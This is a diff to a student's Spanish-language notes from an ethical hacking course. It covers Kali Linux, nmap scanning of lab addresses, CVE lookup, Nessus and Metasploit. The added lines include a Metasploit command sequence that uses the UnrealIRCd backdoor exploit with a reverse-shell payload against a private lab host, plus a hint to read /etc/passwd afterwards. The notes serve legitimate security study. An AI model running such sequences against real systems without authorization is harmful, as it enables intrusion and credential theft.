@@ -1,4 +1,10 @@
-# Kali linux 
+# Estudia 
+ - Kali Linux / Hack the box
+ - Vulnerabilidades / CVE
+ - EDR / XDR
+ - Firewall / WAF
+ - SIEM / SOAR
+# Kali linux
  - Kali Linux es una distribución de Linux basada en Debian diseñada específicamente para pruebas de penetración, análisis forense digital, y seguridad informática. Es mantenida y desarrollada por Offensive Security, y es ampliamente utilizada por profesionales de ciberseguridad, investigadores, y entusiastas para evaluar la seguridad de sistemas y redes.
 # PHRACK 
  - Es una revista con muchos articulos subidos a lo largo del tiempo respecto a la ciberseguridad
@@ -58,6 +64,7 @@ Aprendizaje y Educación: Amplia base de uso en cursos de seguridad informática
  - -h -> nos muestra todos los comandos
  - CTRL + C -> Nos permite cancelar operaciones en la terminal
  - chmod -> se utiliza para cambiar los permisos de archivos y directorios
+ - cat -> Nos permite visualisar un archivo de texto
 
 ## Sudo
  - Permite utilizar comandos en modo superusuario
@@ -482,7 +489,7 @@ Google hace uso de los operadores booleanos para realizar búsquedas combinadas 
  - sudo nmap -v -O 192.168.157.128
  - sudo nmap -v -sS -p 139,445 192.168.157.129
  - sudo nmap -v -sS -p 139,445 --script=smb-os-discovery 192.168.157.129
- - sudo nmap -v -sU -p 161 --script=snmp-win32-software 192.168.157.129
+ - sudo nmap -v -sU -p 161 --script=snmp-win32-software 192.168.157.129s
  - sudo nmap -v -sU -p 161 --script=snmp-win32-users 192.168.157.129
  - sudo nmap -v -sU -p 161 --script=snmp-processes 192.168.157.129
  - sudo nmap -v -sU -p 161 --script=snmp-netstat 192.168.157.129
@@ -490,11 +497,64 @@ Google hace uso de los operadores booleanos para realizar búsquedas combinadas 
 # Clase teorico practica dia 17 01/10/2024
 ## Analisis de vulnerabilidades    
  - Esta fase consistew en la identificacion de fallos de seguridad que se encuentren presentes en los sistemas que se estan evaluando
- - el tipo de fallos abarca desde errores en la configuracion de un servicio hasta vulnerabilidades en determinados servicios que sean publicos y puedan comprometer la integridad del mismo
+ - el tipo de fallos abarca desde errores en la configuracion de un servicio hasta vulnerabilisdades en determinados servicios que sean publicos y puedan comprometer la integridad del mismo
 #### Links y ayudas
  - https://cve.mitre.org/cve/search_cve_list.html
  - nvd.nist.gov/vuln/search/
  - https://www.cvedetails.com/vulnerability-search.php
 ###  CVE, CVSS, CPE - Common Vulnerabilities and Exposures
- - En esta clase vimos como buscar y clasificar de manera sencilla las vulnerabilidaddes que habiamos encontrado anteriormente con las recopilaciones de informacion, con diferentes sitios web que tienen repositorios sobre dichas vulnerabilidades, su nivel de complejidad y nos podrian ayudar a encontrar exploits que nos ayuden a exlotarlas  
-
+ - En esta clase vimos como buscar y clasificar de manera sencilla las vulnerabilidaddes que habiamos encontrado anteriormente con las recopilaciones de informacion, con diferentes sitios web que tienen repositorios sobre dichas vulnerabilidades, su nivel de complejidad y nos podrian ayudar a encontrar exploits que nos ayuden a exlotarlas
+# Clase practica dia 18 02/10/2024
+### Analisis de vulnerabilidades con nmap
+ - Con uno de os scripts de nmap podemos realizar un análisis de vulnerabilidades, en concreto con el script=vuln tambien con sus herramientas nos permite exportarlo a un archivo xml para visualisarlo de una mejor manera, al encontrar vulnerabilidades podremos visualisar algunas de ella por medio de un navegador, tambien se encargara de usar comandos en caso de encontrar vulnerabilidades en dicho aspecto.
+# Clase practica dia 19 03/10/2024
+# Clase practica dia 20 07/10/2024
+### Nessus
+ - Nessus es la aplicacion de analisis de vulnerabilidades mas usada en el mundo, la mayoria de sus versiones son de paga asi que nosotros accedimos a la gratis que esta limitada pero nos va a aservir para probar la app, nos permite crear politicas con las cuales podemos crear analisis personalizados, tambien nos permite crear reportes respecto a el analisis que hayamos realizado y tambien, vimos los 2 tipos de analisis avanzados que tiene nessus, que son el advanced scan y el advanced scan dynamic que el dinamico nos permite personalizar los plugings que se van a usar durante dicho analisis, y el avanzado es tambien perzonalisable pero ya viene con todos los plugings habilitados de base
+# Fin de el analisis de vulnerabilidaddes
+# Clase teorico practica dia 21 08/10/2024
+## Explotacion de vulnerabilidaddes
+ - Esta fase consiste en el uso de tecnicas que permiten al analista aprovechar una vulnerabilidad identificada para obtener algun beneficio desde el punto de vista del ejercicio de hacking etico
+ - se corresponde con una de las fases mas importantes e intrusvas del proceso de hacking etico
+ - deben tenerse muy en cuenta las herramientas de proteccion y deteccion que utiliza la organizacion entre las que se encuentran: anti virus, EDR, IPS, IDS,  HIDS, WAF...
+ - en funcion del componente tegnologico en el que se encuentra la vulnerabilidad, vamos a dividir las fases de explotacion en 
+  - Explotacion de vulnerabilidades en host
+  - Explotacion de vulnerabilidades en Aplicaciones web
+  - Explotacion de vulnerabilidades en red
+## Explotacion de vulnerabilidades en host
+### Explotacion de vulnerabilidades de forma manual
+ - Con la  inforamcion que hayamos obetenido en el analisis te vulnerabildiadesm podremos usar distintos tipos de exploits que nos ayudaran a explotar dichas vulnerabilidades, podemos buscar exploits por internet
+ teniendo precausion ya que pueden ser virus, dichos exploits nos permitiran explotar de distintas formas las vulnerabilidades que hayamos encontrado en dicho escaneo y buscando en linea podremos saber que tipo de vulnerabilidad es y como explotarla
+ en la clase de hoy vimos como explotarla de manera manual modificando el codigo o dicha exploit con emacs, tambien usamos netcat para escuchar y poder conocer la inforamcion que nos esta enviando dicha maquina gracias al exploit
+ el exploit que usamos fue uno enfocado en tomar el control del objetivo, lo buscamos en linea lo modificamos y seguimos las instrucciones para que funcionara de manera correcta, asi pudimos obtener acceso a nuestra mauqina local
+ metasploitable ubuntu y incluso ver algunos ficheros que tiene dicha maquina 
+# Clase practica dia 22 09/10/2024
+## Metasploit
+ - Es una herramienta/Framework tiene implementado un conjunto de exploits para todas las vulnerabilidades que van saliendo tambien se le puede implementar un modulo y el lo almacenara de forma automatica.
+ Tambien tiene herramientas auxiliares que nos permiten realzar toda la fase de lanzamiento del exploit manejo de la conexion, herramientas de pos explotacion, es un entorno completo que nos facilita la creacion de exploits
+ el uso de diferentes payloads, recibir la conexion manejarla etc... metasploit se fundamenta en el concepto modulo cada uno de los exploits se corresponden con un modulo, la unidad basica de metasploit son los modulos tambien
+ tiene plugings, tenemos scripts, bases de datos, librerias. tambien nos permite juntar payloads con exploits, Metasploit usa el lenguaje de programacion ruby
+### Payloads 
+ - singles -> payloads autocontenidos y autosuficientes no nececitan de metasploit para funcionar, ejemplo si tenemos un payload que nos devuelve una conexion podremos recibirla con la herramienta que queramos; recibir una conexion inversa, añadir un usuario 
+ - stagers -> son payloads pequeños para tareas especificas que nos permiten establecer una conexion con una maquina y nos devuelven una conexion reversa y descarga o aprovecha algun payload de tipo stages para realizar alguna accion (Depende mucho mas de metasploit)
+ - stages -> son payloads realizan acciones mucho mas avanzadas inyectar; una dll en un proceso, devolverr una shell encriptada(Depende mucho mas de metasploit)
+### Comandos metasploit
+ - search -> nos permite buscar un exploit para alguna vulnerabilidad que hayamos encontrado tambien nos permite buscar auxiliares, payloads
+ - use -> nos permite usar uno de los exploits que tenga metasploit
+ - back -> retrocede o cancela una accion
+ - show options -> Nos muestra las opciones necesarias para el exploit funcione
+ - show advanced -> Nos muestra opciones mas avanzadas de un exploit
+ - set -> nos permite modificar una de las opciones del exploit
+ - exploit -> Nos permite ejecutar el exploit 
+ - show payloads -> Nos permite observar todos los payloads compatibles con el exploit
+ - sessions -> Nos muetsra las sesiones que tenemos activas
+### Ejemplos Metasploit
+ - set rhost 192.168.157.128
+ - set lhost 192.168.157.130
+ - use unix/irc/unreal_ircd_3281_backdoor
+ - show payloads
+ - set payload cmd/unix/generic
+ - set payload cmd/unix/reverse
+ - exploit
+### Comandos importantes dentro de la maquina 
+ - /etc/passwd -> Nos muestra los usuarios e informacion importante
